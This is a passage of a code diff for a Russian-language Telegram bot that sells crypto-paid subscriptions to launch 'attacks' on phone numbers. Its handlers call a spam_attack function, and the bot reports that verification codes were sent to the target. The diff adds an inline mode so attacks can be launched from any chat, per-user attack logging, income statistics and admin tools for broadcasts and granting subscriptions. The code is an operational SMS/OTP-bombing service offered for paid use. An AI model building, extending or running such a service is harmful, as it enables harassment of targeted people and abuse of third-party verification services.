+        invoice = create_invoice(user_id, amount, sub_type)
         
         if invoice['success']:
             markup = types.InlineKeyboardMarkup()
-            pay_btn = types.InlineKeyboardButton('💳 Оплатить', url=invoice['pay_url'])
-            check_btn = types.InlineKeyboardButton('✅ Проверить оплату', 
-                                                   callback_data=f'check_{invoice["invoice_id"]}')
-            markup.add(pay_btn, check_btn)
+            btn1 = types.InlineKeyboardButton('💳 Оплатить', url=invoice['pay_url'])
+            btn2 = types.InlineKeyboardButton('✅ Проверить', callback_data=f'check_{invoice["invoice_id"]}')
+            markup.add(btn1, btn2)
             
             bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text=f"💰 *СЧЕТ ДЛЯ ОПЛАТЫ*\n\n"
-                     f"Сумма: *{amount}$*\n"
-                     f"Тариф: *{subscription_type}*\n"
-                     f"ID: `{invoice['invoice_id']}`\n\n"
-                     f"*Инструкция:*\n"
-                     f"1. Нажмите 'Оплатить'\n"
-                     f"2. Оплатите через CryptoBot\n"
-                     f"3. Нажмите 'Проверить оплату'\n\n"
-                     f"*Оплата в USDT через Telegram*",
-                parse_mode="Markdown",
+                chat_id=chat_id,
+                message_id=message_id,
+                text=f"""
+💳 <b>Оплата подписки</b>
+
+Сумма: <b>{amount}$</b>
+Тариф: <b>{sub_type}</b>
+ID платежа: <code>{invoice['invoice_id']}</code>
+
+👇 <b>Действия:</b>
+1. Нажмите "Оплатить"
+2. Оплатите в CryptoBot
+3. Нажмите "Проверить"
+                """,
                 reply_markup=markup
             )
         else:
-            bot.answer_callback_query(call.id, "❌ Ошибка создания счета", show_alert=True)
+            bot.answer_callback_query(call.id, "❌ Ошибка создания счета")
     
     # Проверка оплаты
     elif call.data.startswith('check_'):
         invoice_id = call.data[6:]
-        
-        # Проверяем статус
-        status = check_invoice_status(invoice_id)
+        status = check_payment(invoice_id)
         
         if status == 'paid':
             # Находим тип подписки
-            conn = sqlite3.connect('users.db')
+            conn = sqlite3.connect(DATABASE_NAME)
             cursor = conn.cursor()
             cursor.execute('SELECT subscription_type FROM payments WHERE invoice_id = ?', (invoice_id,))
             result = cursor.fetchone()
             
             if result:
-                subscription_type = result[0]
-                update_subscription(user_id, subscription_type)
+                sub_type = result[0]
+                update_subscription(user_id, sub_type)
                 
-                # Обновляем статус платежа
                 cursor.execute('UPDATE payments SET status = ? WHERE invoice_id = ?', ('paid', invoice_id))
                 conn.commit()
                 conn.close()
                 
                 bot.edit_message_text(
-                    chat_id=call.message.chat.id,
-                    message_id=call.message.message_id,
-                    text="✅ *ОПЛАТА ПОДТВЕРЖДЕНА!*\n\n"
-                         "Подписка успешно активирована!\n"
-                         "Теперь вы можете использовать бота.",
-                    parse_mode="Markdown"
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text="✅ <b>Оплата подтверждена!</b>\n\nПодписка активирована. Теперь можно использовать бота.",
+                    reply_markup=back_button()
                 )
             else:
-                bot.answer_callback_query(call.id, "❌ Платеж не найден", show_alert=True)
-        elif status == 'active':
-            bot.answer_callback_query(call.id, "⏳ Ожидаем оплату...", show_alert=True)
+                bot.answer_callback_query(call.id, "❌ Платеж не найден")
         else:
-            bot.answer_callback_query(call.id, "❌ Оплата не получена", show_alert=True)
+            bot.answer_callback_query(call.id, "⏳ Оплата еще не поступила")
     
-    # Начало атаки
+    # Начало атаки из основного режима
     elif call.data.startswith('attack_'):
-        phone = call.data[7:]  # Извлекаем номер из callback_data
+        phone = call.data[7:]
         
-        # Обновляем сообщение
         bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text=f"⚡️ *ЗАПУСК АТАКИ...*\n\n"
-                 f"📱 Цель: `{phone}`\n"
-                 f"⏳ Статус: *Подготовка*",
-            parse_mode="Markdown"
+            chat_id=chat_id,
+            message_id=message_id,
+            text=f"⚡️ <b>Начинаю атаку...</b>\n\nНомер: <code>{phone}</code>\n\n⏳ Подождите 10-15 секунд...",
+            reply_markup=None
         )
         
-        # Запускаем атаку в отдельном потоке
+        # Запуск в отдельном потоке
         def run_attack():
             try:
-                # Обновляем статус в базе
-                conn = sqlite3.connect('users.db')
+                requests_sent, duration = spam_attack(phone, is_inline=False)
+                
+                # Сохраняем в базу
+                conn = sqlite3.connect(DATABASE_NAME)
                 cursor = conn.cursor()
                 cursor.execute('''
-                    UPDATE attacks SET status = 'in_progress' 
-                    WHERE user_id = ? AND target_phone = ? 
-                    ORDER BY timestamp DESC LIMIT 1
-                ''', (user_id, phone))
-                conn.commit()
+                    INSERT INTO attacks (user_id, phone_number, requests_sent, status, timestamp, is_inline)
+                    VALUES (?, ?, ?, ?, ?, ?)
+                ''', (user_id, phone, requests_sent, 'completed', datetime.datetime.now().isoformat(), 0))
                 
-                # Запускаем атаку
-                success_count = spam_attack_advanced(phone)
-                
-                # Обновляем статус
-                cursor.execute('''
-                    UPDATE attacks SET status = 'completed' 
-                    WHERE user_id = ? AND target_phone = ? 
-                    ORDER BY timestamp DESC LIMIT 1
-                ''', (user_id, phone))
+                cursor.execute('UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?', (user_id,))
                 conn.commit()
                 conn.close()
                 
-                # Отправляем результат
                 bot.edit_message_text(
-                    chat_id=call.message.chat.id,
-                    message_id=call.message.message_id,
-                    text=f"✅ *АТАКА ЗАВЕРШЕНА*\n\n"
-                         f"📱 Номер: `{phone}`\n"
-                         f"📊 Успешных запросов: *{success_count}*\n"
-                         f"⏱ Время: {datetime.datetime.now().strftime('%H:%M:%S')}\n\n"
-                         f"🎯 *Цель атакована успешно!*",
-                    parse_mode="Markdown"
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=f"""
+✅ <b>Атака завершена!</b>
+
+📱 Номер: <code>{phone}</code>
+📊 Запросов отправлено: <b>{requests_sent}</b>
+⏱ Время: <b>{duration:.1f} сек</b>
+🎯 Статус: <b>Успешно</b>
+
+Атака выполнена. На номер отправлены коды.
+                    """,
+                    reply_markup=back_button()
                 )
                 
             except Exception as e:
                 logger.error(f"Ошибка атаки: {e}")
                 bot.edit_message_text(
-                    chat_id=call.message.chat.id,
-                    message_id=call.message.message_id,
-                    text=f"❌ *ОШИБКА АТАКИ*\n\n"
-                         f"Произошла ошибка: {str(e)[:100]}",
-                    parse_mode="Markdown"
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=f"❌ <b>Ошибка атаки:</b>\n\n{str(e)}",
+                    reply_markup=back_button()
                 )
         
         thread = threading.Thread(target=run_attack)
         thread.start()
     
+    # Начало атаки из inline режима
+    elif call.data.startswith('inline_attack_'):
+        phone = call.data[14:]
+        
+        # Проверяем подписку
+        if not check_subscription(user_id):
+            bot.answer_callback_query(
+                call.id,
+                "❌ Нет активной подписки! Купите подписку в боте.",
+                show_alert=True
+            )
+            return
+        
+        # Обновляем текст сообщения в чате
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=f"⚡️ <b>Запуск атаки...</b>\n\nНомер: <code>{phone}</code>\n\n⏳ Атака начата, подождите...",
+            reply_markup=None
+        )
+        
+        # Запуск атаки в отдельном потоке
+        def run_inline_attack():
+            try:
+                requests_sent, duration = spam_attack(phone, is_inline=True)
+                
+                # Сохраняем в базу
+                conn = sqlite3.connect(DATABASE_NAME)
+                cursor = conn.cursor()
+                cursor.execute('''
+                    INSERT INTO attacks (user_id, phone_number, requests_sent, status, timestamp, is_inline)
+                    VALUES (?, ?, ?, ?, ?, ?)
+                ''', (user_id, phone, requests_sent, 'completed', datetime.datetime.now().isoformat(), 1))
+                
+                cursor.execute('UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?', (user_id,))
+                conn.commit()
+                conn.close()
+                
+                # Обновляем сообщение в чате
+                bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=f"""
+✅ <b>Атака завершена!</b>
+
+📱 Номер: <code>{phone}</code>
+📊 Запросов отправлено: <b>{requests_sent}</b>
+⏱ Время: <b>{duration:.1f} сек</b>
+👤 От: <b>@{call.from_user.username or 'Пользователь'}</b>
+
+Атака выполнена через inline режим.
+                    """,
+                    reply_markup=None
+                )
+                
+            except Exception as e:
+                logger.error(f"Ошибка inline атаки: {e}")
+                bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=f"❌ <b>Ошибка атаки:</b>\n\n{str(e)}",
+                    reply_markup=None
+                )
+        
+        thread = threading.Thread(target=run_inline_attack)
+        thread.start()
+        bot.answer_callback_query(call.id, "⚡️ Атака запущена!")
+    
     # Отмена атаки
     elif call.data == 'cancel_attack':
         bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text="❌ *АТАКА ОТМЕНЕНА*",
-            parse_mode="Markdown"
+            chat_id=chat_id,
+            message_id=message_id,
+            text="❌ <b>Атака отменена</b>",
+            reply_markup=back_button()
         )
-
-# ==================== АДМИН КОМАНДЫ ====================
-@bot.message_handler(commands=['admin'])
-def admin_panel(message):
-    if message.from_user.id != ADMIN_ID:
-        return
     
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    btn1 = types.InlineKeyboardButton('📊 Статистика', callback_data='admin_stats')
-    btn2 = types.InlineKeyboardButton('👤 Пользователи', callback_data='admin_users')
-    btn3 = types.InlineKeyboardButton('📈 Финансы', callback_data='admin_finance')
-    markup.add(btn1, btn2, btn3)
-    
-    bot.send_message(
-        message.chat.id,
-        "⚙️ *АДМИН ПАНЕЛЬ*",
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
-def admin_callback(call):
-    if call.from_user.id != ADMIN_ID:
-        return
-    
-    if call.data == 'admin_stats':
-        conn = sqlite3.connect('users.db')
+    # Админ меню
+    elif call.data == 'admin_stats':
+        conn = sqlite3.connect(DATABASE_NAME)
         cursor = conn.cursor()
         
         cursor.execute('SELECT COUNT(*) FROM users')
         total_users = cursor.fetchone()[0]
         
+        cursor.execute('SELECT COUNT(*) FROM users WHERE subscription_end > datetime("now")')
+        active_subs = cursor.fetchone()[0]
+        
         cursor.execute('SELECT COUNT(*) FROM attacks')
         total_attacks = cursor.fetchone()[0]
         
-        cursor.execute('SELECT COUNT(*) FROM payments WHERE status = "paid"')
-        total_payments = cursor.fetchone()[0]
+        cursor.execute('SELECT COUNT(*) FROM attacks WHERE is_inline = 1')
+        inline_attacks = cursor.fetchone()[0]
+        
+        cursor.execute('SELECT SUM(amount) FROM payments WHERE status = "paid"')
+        total_income = cursor.fetchone()[0] or 0
         
         conn.close()
         
+        text = f"""
+📊 <b>Статистика бота</b>
+
+👥 Пользователей: <b>{total_users}</b>
+✅ Активных подписок: <b>{active_subs}</b>
+🎯 Всего атак: <b>{total_attacks}</b>
+🔍 Inline атак: <b>{inline_attacks}</b>
+💰 Общий доход: <b>{total_income:.2f}$</b>
+🕐 Дата: <b>{datetime.datetime.now().strftime("%d.%m.%Y %H:%M")}</b>
+        """
+        
         bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text=f"📊 *СТАТИСТИКА БОТА*\n\n"
-                 f"👥 Пользователей: {total_users}\n"
-                 f"🎯 Атак выполнено: {total_attacks}\n"
-                 f"💰 Оплаченных подписок: {total_payments}\n"
-                 f"⏰ Бот онлайн",
-            parse_mode="Markdown"
+            chat_id=chat_id,
+            message_id=message_id,
+            text=text,
+            reply_markup=admin_menu()
+        )
+    
+    elif call.data == 'admin_users':
+        conn = sqlite3.connect(DATABASE_NAME)
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            SELECT user_id, username, first_name, subscription_type, total_attacks 
+            FROM users 
+            ORDER BY join_date DESC 
+            LIMIT 20
+        ''')
+        
+        users = cursor.fetchall()
+        conn.close()
+        
+        if users:
+            text = "👥 <b>Последние пользователи</b>\n\n"
+            for user in users:
+                user_id, username, first_name, sub_type, attacks = user
+                text += f"• <b>{first_name}</b> (@{username or 'нет'})\n"
+                text += f"  ID: <code>{user_id}</code>\n"
+                text += f"  Подписка: {sub_type or 'Нет'}\n"
+                text += f"  Атак: {attacks}\n\n"
+        else:
+            text = "❌ Пользователей нет"
+        
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=text,
+            reply_markup=admin_menu()
+        )
+    
+    elif call.data == 'admin_settings':
+        text = """
+⚙️ <b>Настройки бота</b>
+
+👇 <b>Выберите что изменить:</b>
+        """
+        
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        btn1 = types.InlineKeyboardButton('✏️ Баннер', callback_data='admin_edit_banner')
+        btn2 = types.InlineKeyboardButton('📝 Приветствие', callback_data='admin_edit_welcome')
+        btn3 = types.InlineKeyboardButton('🔙 Назад', callback_data='admin_back')
+        markup.add(btn1, btn2, btn3)
+        
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=text,
+            reply_markup=markup
+        )
+    
+    elif call.data == 'admin_edit_banner':
+        msg = bot.send_message(
+            chat_id,
+            "✏️ <b>Введите новый баннер:</b>\n\n"
+            "Используйте <code><pre>текст</pre></code> для форматирования.\n"
+            "Отправьте сообщение с новым баннером:",
+            reply_markup=back_button()
+        )
+        
+        bot.register_next_step_handler(msg, save_new_banner)
+    
+    elif call.data == 'admin_back':
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text="👑 <b>Админ панель</b>\n\nВыберите действие:",
+            reply_markup=admin_menu()
+        )
+    
+    elif call.data == 'admin_broadcast':
+        msg = bot.send_message(
+            chat_id,
+            "📢 <b>Рассылка сообщений</b>\n\n"
+            "Введите сообщение для рассылки всем пользователям:",
+            reply_markup=back_button()
+        )
+        
+        bot.register_next_step_handler(msg, process_broadcast)
+    
+    elif call.data == 'admin_add_sub':
+        msg = bot.send_message(
+            chat_id,
+            "➕ <b>Выдача подписки</b>\n\n"
+            "Введите ID пользователя и срок через пробел:\n"
+            "Пример: <code>123456789 30days</code>",
+            reply_markup=back_button()
+        )
+        
+        bot.register_next_step_handler(msg, process_add_sub)
+
+def save_new_banner(message):
+    if message.text == '🔙 Назад':
+        bot.send_message(message.chat.id, "Отменено", reply_markup=admin_menu())
+        return
+    
+    update_setting('banner', message.text)
+    bot.send_message(
+        message.chat.id,
+        "✅ <b>Баннер обновлен!</b>\n\nНовый баннер будет отображаться при команде /start",
+        reply_markup=admin_menu()
+    )
+
+def process_broadcast(message):
+    if message.text == '🔙 Назад':
+        bot.send_message(message.chat.id, "Отменено", reply_markup=admin_menu())
+        return
+    
+    conn = sqlite3.connect(DATABASE_NAME)
+    cursor = conn.cursor()
+    cursor.execute('SELECT user_id FROM users')
+    users = cursor.fetchall()
+    conn.close()
+    
+    sent = 0
+    failed = 0
+    
+    for user in users:
+        try:
+            bot.send_message(user[0], f"📢 <b>Сообщение от администратора:</b>\n\n{message.text}")
+            sent += 1
+            time.sleep(0.05)
+        except:
+            failed += 1
+    
+    bot.send_message(
+        message.chat.id,
+        f"✅ <b>Рассылка завершена</b>\n\n"
+        f"Отправлено: <b>{sent}</b>\n"
+        f"Не отправлено: <b>{failed}</b>",
+        reply_markup=admin_menu()
+    )
+
+def process_add_sub(message):
+    if message.text == '🔙 Назад':
+        bot.send_message(message.chat.id, "Отменено", reply_markup=admin_menu())
+        return
+    
+    try:
+        parts = message.text.split()
+        if len(parts) != 2:
+            raise ValueError
+        
+        user_id = int(parts[0])
+        sub_type = parts[1]
+        
+        if sub_type not in ['7days', '30days', 'forever']:
+            raise ValueError
+        
+        update_subscription(user_id, sub_type)
+        
+        bot.send_message(
+            message.chat.id,
+            f"✅ <b>Подписка выдана</b>\n\n"
+            f"Пользователь: <code>{user_id}</code>\n"
+            f"Срок: <b>{sub_type}</b>",
+            reply_markup=admin_menu()
+        )
+        
+        # Уведомляем пользователя
+        try:
+            bot.send_message(
+                user_id,
+                f"🎁 <b>Вам выдана подписка!</b>\n\n"
+                f"Тип: <b>{sub_type}</b>\n"
+                f"Срок: до окончания периода\n\n"
+                f"Теперь вы можете использовать бота."
+            )
+        except:
+            pass
+            
+    except:
+        bot.send_message(
+            message.chat.id,
+            "❌ <b>Ошибка</b>\n\n"
+            "Неверный формат. Пример: <code>123456789 30days</code>",
+            reply_markup=admin_menu()
         )
 
-# ==================== ЗАПУСК БОТА ====================
+# ==================== ЗАПУСК ====================
 def payment_checker():
-    """Поток для проверки платежей"""
+    """Проверка платежей в фоне"""
     while True:
         try:
-            conn = sqlite3.connect('users.db')
+            conn = sqlite3.connect(DATABASE_NAME)
             cursor = conn.cursor()
             
-            # Находим ожидающие платежи
             cursor.execute('SELECT invoice_id, user_id, subscription_type FROM payments WHERE status = "pending"')
             pending = cursor.fetchall()
             
-            for invoice_id, user_id, subscription_type in pending:
-                status = check_invoice_status(invoice_id)
+            for invoice_id, user_id, sub_type in pending:
+                status = check_payment(invoice_id)
                 
                 if status == 'paid':
-                    # Активируем подписку
-                    update_subscription(user_id, subscription_type)
+                    update_subscription(user_id, sub_type)
                     cursor.execute('UPDATE payments SET status = ? WHERE invoice_id = ?', ('paid', invoice_id))
                     
-                    # Уведомляем пользователя
                     try:
                         bot.send_message(
                             user_id,
-                            "✅ *ОПЛАТА ПОДТВЕРЖДЕНА!*\n\n"
-                            "Ваша подписка активирована.\n"
-                            "Теперь вы можете использовать бота.",
-                            parse_mode="Markdown"
+                            "✅ <b>Оплата подтверждена!</b>\n\n"
+                            "Ваша подписка активирована. Теперь можно использовать бота."
                         )
                     except:
                         pass
-                    
-                    logger.info(f"Подписка активирована для пользователя {user_id}")
             
             conn.commit()
             conn.close()
@@ -675,21 +1206,23 @@ def payment_checker():
         except Exception as e:
             logger.error(f"Ошибка проверки платежей: {e}")
         
-        time.sleep(60)  # Проверяем каждую минуту
+        time.sleep(60)
 
 if __name__ == '__main__':
-    # Инициализация базы данных
     init_database()
-    logger.info("База данных инициализирована")
     
-    # Запускаем проверку платежей в отдельном потоке
-    checker_thread = threading.Thread(target=payment_checker, daemon=True)
-    checker_thread.start()
-    logger.info("Проверка платежей запущена")
+    # Включаем inline режим
+    print(f"Бот запущен! Имя бота для inline режима: @{bot.get_me().username}")
+    print(f"Используйте @{bot.get_me().username} в любом чате для запуска атак!")
     
-    # Запускаем бота
-    logger.info("Бот запускается...")
+    # Запуск проверки платежей
+    checker = threading.Thread(target=payment_checker, daemon=True)
+    checker.start()
+    
+    logger.info("Бот запущен")
+    print("Бот запущен и готов к работе!")
+    
     try:
-        bot.polling(none_stop=True, interval=0, timeout=20)
+        bot.polling(none_stop=True)
     except Exception as e:
         logger.error(f"Ошибка бота: {e}")
